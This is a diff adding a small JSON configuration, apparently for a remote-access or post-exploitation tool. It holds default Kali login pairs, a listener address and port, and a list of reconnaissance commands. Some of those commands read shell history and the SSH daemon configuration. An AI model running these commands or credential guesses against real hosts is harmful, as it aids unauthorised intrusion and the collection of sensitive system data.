@@ -1,0 +1,29 @@
+{
+    "whitelist_ips": ["192.168.1.1", "192.168.1.2"],
+    "credentials": [
+        {
+            "username": "root",
+            "password": "toor"
+        },
+        {
+            "username": "kali",
+            "password": "kali"
+        }
+    ],
+    "commands": [
+        "ip addr",
+        "who",
+        "systemctl list-units --type=service",
+        "uname -a",
+        "hostname",
+        "ip route",
+        "netstat -tuln",
+        "iptables -L",
+        "cat ~/.bash_history",
+        "cat /etc/ssh/sshd_config"
+    ],
+    "listener": {
+        "ip": "192.168.101.53",
+        "port": "14151"
+    }
+}
